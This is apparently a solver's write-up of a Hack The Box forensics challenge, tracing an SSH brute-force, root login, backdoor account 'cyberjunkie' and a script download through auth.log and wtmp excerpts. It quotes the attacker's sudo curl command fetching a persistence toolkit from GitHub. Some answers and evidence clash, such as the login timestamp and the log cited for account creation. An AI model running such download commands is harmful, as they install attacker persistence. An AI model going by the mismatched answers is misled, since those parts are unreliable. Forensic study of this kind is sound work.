# Questions
- Analyze the auth.log. What is the IP address used by the attacker to carry out a brute force attack?
	- 65.2.161.68
- The bruteforce attempts were successful and attacker gained access to an account on the server. What is the username of the account?
	- root
- Identify the UTC timestamp when the attacker logged in manually to the server and established a terminal session to carry out their objectives. The login time will be different than the authentication time, and can be found in the wtmp artifact.
	- 2024-03-05 22:32:45
- SSH login sessions are tracked and assigned a session number upon login. What is the session number assigned to the attacker's session for the user account from Question 2?
	- 37
- The attacker added a new user as part of their persistence strategy on the server and gave this new user account higher privileges. What is the name of this account?
	- cyberjunkie
- What is the MITRE ATT&CK sub-technique ID used for persistence by creating a new account?
	-  T1136.001
- What time did the attacker's first SSH session end according to auth.log?
	- 2024-03-06 06:37:24
- The attacker logged into their backdoor account and utilized their higher privileges to download a script. What is the full command executed using sudo?
	- /usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh


# Notes
- After unzipping, we are given 3 files to work with: auth.log, utmp.py, and wtmp
- To answer the first question, we need to refer to auth.log.
- We can find the attacker's IP of 65.2.161.68 after seeing multiple disconnects occur from that address
```
Mar  6 06:31:35 ip-172-31-35-28 sshd[2327]: Received disconnect from 65.2.161.68 port 46392:11: Bye Bye [preauth]  
Mar  6 06:31:35 ip-172-31-35-28 sshd[2327]: Disconnected from invalid user admin 65.2.161.68 port 46392 [preauth]  
Mar  6 06:31:35 ip-172-31-35-28 sshd[2332]: Received disconnect from 65.2.161.68 port 46444:11: Bye Bye [preauth]  
Mar  6 06:31:35 ip-172-31-35-28 sshd[2332]: Disconnected from invalid user admin 65.2.161.68 port 46444 [preauth]  
Mar  6 06:31:35 ip-172-31-35-28 sshd[2331]: Received disconnect from 65.2.161.68 port 46436:11: Bye Bye [preauth]  
Mar  6 06:31:35 ip-172-31-35-28 sshd[2331]: Disconnected from invalid user admin 65.2.161.68 port 46436 [preauth]  
Mar  6 06:31:35 ip-172-31-35-28 sshd[2337]: Received disconnect from 65.2.161.68 port 46498:11: Bye Bye [preauth]  
Mar  6 06:31:35 ip-172-31-35-28 sshd[2337]: Disconnected from invalid user admin 65.2.161.68 port 46498 [preauth]  
Mar  6 06:31:35 ip-172-31-35-28 sshd[2328]: Received disconnect from 65.2.161.68 port 46390:11: Bye Bye [preauth]  
Mar  6 06:31:35 ip-172-31-35-28 sshd[2328]: Disconnected from invalid user admin 65.2.161.68 port 46390 [preauth]  
Mar  6 06:31:35 ip-172-31-35-28 sshd[2330]: Received disconnect from 65.2.161.68 port 46422:11: Bye Bye [preauth]  
Mar  6 06:31:35 ip-172-31-35-28 sshd[2330]: Disconnected from invalid user admin 65.2.161.68 port 46422 [preauth]  
Mar  6 06:31:35 ip-172-31-35-28 sshd[2334]: Received disconnect from 65.2.161.68 port 46454:11: Bye Bye [preauth]  
Mar  6 06:31:35 ip-172-31-35-28 sshd[2334]: Disconnected from invalid user admin 65.2.161.68 port 46454 [preauth]  
Mar  6 06:31:35 ip-172-31-35-28 sshd[2335]: Received disconnect from 65.2.161.68 port 46460:11: Bye Bye [preauth]  
Mar  6 06:31:35 ip-172-31-35-28 sshd[2335]: Disconnected from invalid user admin 65.2.161.68 port 46460 [preauth]  
Mar  6 06:31:35 ip-172-31-35-28 sshd[2329]: Received disconnect from 65.2.161.68 port 46414:11: Bye Bye [preauth]  
Mar  6 06:31:35 ip-172-31-35-28 sshd[2329]: Disconnected from invalid user admin 65.2.161.68 port 46414 [preauth]  
Mar  6 06:31:35 ip-172-31-35-28 sshd[2333]: Received disconnect from 65.2.161.68 port 46452:11: Bye Bye [preauth]  
Mar  6 06:31:35 ip-172-31-35-28 sshd[2333]: Disconnected from invalid user admin 65.2.161.68 port 46452 [preauth]
```
- For the second question, we can look into the log to see the successful login of the root account
```
Mar  6 06:19:54 ip-172-31-35-28 sshd[1465]: Accepted password for root from 203.101.190.9 port 42825 ssh2  
Mar  6 06:19:54 ip-172-31-35-28 sshd[1465]: pam_unix(sshd:session): session opened for user root(uid=0) by (uid=0)  
Mar  6 06:19:54 ip-172-31-35-28 systemd-logind[411]: New session 6 of user root.
```
- Now, we need to find the timestamp of when the attack got access to the system.
- We just go into the wtmp file, according to the question, to find out what it is
- Reading out wtmp provides no use since it's encoded. However, using the python script we are given, we are able to easily get it readable by running the file through it
```
python3 utmp.py wtmp -o wtmp.out
```
- We can now get something much more readable!
- I'll put the output here so that we can reference it here rather than rerunning the script over and over again
```
"type"  "pid"   "line"  "id"    "user"  "host"  "term"  "exit"  "session"       "sec"   "usec"  "addr"  
"BOOT_TIME"     "0"     "~"     "~~"    "reboot"        "6.2.0-1017-aws"        "0"     "0"     "0"     "2024/01/25 03:12:17"   "804944"        "0.0.0.0"  
"INIT"  "601"   "ttyS0" "tyS0"  ""      ""      "0"     "0"     "601"   "2024/01/25 03:12:31"   "72401" "0.0.0.0"  
"LOGIN" "601"   "ttyS0" "tyS0"  "LOGIN" ""      "0"     "0"     "601"   "2024/01/25 03:12:31"   "72401" "0.0.0.0"  
"INIT"  "618"   "tty1"  "tty1"  ""      ""      "0"     "0"     "618"   "2024/01/25 03:12:31"   "80342" "0.0.0.0"  
"LOGIN" "618"   "tty1"  "tty1"  "LOGIN" ""      "0"     "0"     "618"   "2024/01/25 03:12:31"   "80342" "0.0.0.0"  
"RUN_LVL"       "53"    "~"     "~~"    "runlevel"      "6.2.0-1017-aws"        "0"     "0"     "0"     "2024/01/25 03:12:33"   "792454"        "0.0.0.0"  
"USER"  "1284"  "pts/0" "ts/0"  "ubuntu"        "203.101.190.9" "0"     "0"     "0"     "2024/01/25 03:13:58"   "354674"        "203.101.190.9"  
"DEAD"  "1284"  "pts/0" ""      ""      ""      "0"     "0"     "0"     "2024/01/25 03:15:12"   "956114"        "0.0.0.0"  
"USER"  "1483"  "pts/0" "ts/0"  "root"  "203.101.190.9" "0"     "0"     "0"     "2024/01/25 03:15:40"   "806926"        "203.101.190.9"  
"DEAD"  "1404"  "pts/0" ""      ""      ""      "0"     "0"     "0"     "2024/01/25 04:34:34"   "949753"        "0.0.0.0"  
"USER"  "836798"        "pts/0" "ts/0"  "root"  "203.101.190.9" "0"     "0"     "0"     "2024/02/11 02:33:49"   "408334"        "203.101.190.9"  
"INIT"  "838568"        "ttyS0" "tyS0"  ""      ""      "0"     "0"     "838568"        "2024/02/11 02:39:02"   "172417"        "0.0.0.0"  
"LOGIN" "838568"        "ttyS0" "tyS0"  "LOGIN" ""      "0"     "0"     "838568"        "2024/02/11 02:39:02"   "172417"        "0.0.0.0"  
"USER"  "838962"        "pts/1" "ts/1"  "root"  "203.101.190.9" "0"     "0"     "0"     "2024/02/11 02:41:11"   "700107"        "203.101.190.9"  
"DEAD"  "838896"        "pts/1" ""      ""      ""      "0"     "0"     "0"     "2024/02/11 02:41:46"   "272984"        "0.0.0.0"  
"USER"  "842171"        "pts/1" "ts/1"  "root"  "203.101.190.9" "0"     "0"     "0"     "2024/02/11 02:54:27"   "775434"        "203.101.190.9"  
"DEAD"  "842073"        "pts/1" ""      ""      ""      "0"     "0"     "0"     "2024/02/11 03:08:04"   "769514"        "0.0.0.0"  
"DEAD"  "836694"        "pts/0" ""      ""      ""      "0"     "0"     "0"     "2024/02/11 03:08:04"   "769963"        "0.0.0.0"  
"RUN_LVL"       "0"     "~"     "~~"    "shutdown"      "6.2.0-1017-aws"        "0"     "0"     "0"     "2024/02/11 03:09:18"   "731"   "0.0.0.0"  
"BOOT_TIME"     "0"     "~"     "~~"    "reboot"        "6.2.0-1018-aws"        "0"     "0"     "0"     "2024/03/05 22:17:15"   "744575"        "0.0.0.0"  
"INIT"  "464"   "ttyS0" "tyS0"  ""      ""      "0"     "0"     "464"   "2024/03/05 22:17:27"   "354378"        "0.0.0.0"  
"LOGIN" "464"   "ttyS0" "tyS0"  "LOGIN" ""      "0"     "0"     "464"   "2024/03/05 22:17:27"   "354378"        "0.0.0.0"  
"INIT"  "505"   "tty1"  "tty1"  ""      ""      "0"     "0"     "505"   "2024/03/05 22:17:27"   "469940"        "0.0.0.0"  
"LOGIN" "505"   "tty1"  "tty1"  "LOGIN" ""      "0"     "0"     "505"   "2024/03/05 22:17:27"   "469940"        "0.0.0.0"  
"RUN_LVL"       "53"    "~"     "~~"    "runlevel"      "6.2.0-1018-aws"        "0"     "0"     "0"     "2024/03/05 22:17:29"   "538024"        "0.0.0.0"  
"USER"  "1583"  "pts/0" "ts/0"  "root"  "203.101.190.9" "0"     "0"     "0"     "2024/03/05 22:19:55"   "151913"        "203.101.190.9"  
"USER"  "2549"  "pts/1" "ts/1"  "root"  "65.2.161.68"   "0"     "0"     "0"     "2024/03/05 22:32:45"   "387923"        "65.2.161.68"  
"DEAD"  "2491"  "pts/1" ""      ""      ""      "0"     "0"     "0"     "2024/03/05 22:37:24"   "590579"        "0.0.0.0"  
"USER"  "2667"  "pts/1" "ts/1"  "cyberjunkie"   "65.2.161.68"   "0"     "0"     "0"     "2024/03/05 22:37:35"   "475575"        "65.2.161.68"
```
- Knowing that the attacker is using the IP of 65.2.161.68, we can actually narrow it down to this log line to get the timestamp
```
[Nov 28, 2025 - 22:30:18 (PST)] exegol-htb-sherlocks /workspace # cat wtmp.out | grep 65.2.161.68  
"USER"  "2549"  "pts/1" "ts/1"  "root"  "65.2.161.68"   "0"     "0"     "0"     "2024/03/05 22:32:45"   "387923"        "65.2.161.68"  
"USER"  "2667"  "pts/1" "ts/1"  "cyberjunkie"   "65.2.161.68"   "0"     "0"     "0"     "2024/03/05 22:37:35"   "475575"        "65.2.161.68"
```
- However, it should be noted that this date is in PST, so we need to convert it to UTC for it to work
![[Screenshot_20251128_223332.png]]
- This results in the actual timestamp of: 2024-03-06 06:32:45
- Now, we need to find an attacker session for the user account that the attacker used for Task 2, so we need to find a session for the root account
- We can find this in the auth.log file
```
Mar  6 06:32:44 ip-172-31-35-28 sshd[2491]: Accepted password for root from 65.2.161.68 port 53184 ssh2  
Mar  6 06:32:44 ip-172-31-35-28 sshd[2491]: pam_unix(sshd:session): session opened for user root(uid=0) by (uid=0)  
Mar  6 06:32:44 ip-172-31-35-28 systemd-logind[411]: New session 37 of user root.
```
- Now, we need to find out which account was added during the attacker's session
- This can be found easily in the auth.log
```
Mar  6 06:39:38 ip-172-31-35-28 sudo: cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ; COMMAND=/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh  
Mar  6 06:39:38 ip-172-31-35-28 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by cyberjunkie(uid=1002)  
Mar  6 06:39:39 ip-172-31-35-28 sudo: pam_unix(sudo:session): session closed for user root
```
- Now, we need to find the MITRE ATT&CK sub-technique ID. Specifically, for persistence by creating a new, local account.
- After some research, we are able to find it as T1136.001
	- https://attack.mitre.org/techniques/T1136/001/
- Now, we need to find when the first SSH session ended in the auth.log
- We are able to find the timestamp here
```
Mar  6 06:37:24 ip-172-31-35-28 systemd-logind[411]: Removed session 37.
```
- Lastly, we need to find the command that allowed the attacker to do these actions. So, we need to find some sort of backdoor being used
- Looking into the log, we can now find a URL that involves a script!
```
Mar  6 06:39:38 ip-172-31-35-28 sudo: cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ; COMMAND=/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
```
- BOOM! We found the backdoor being used.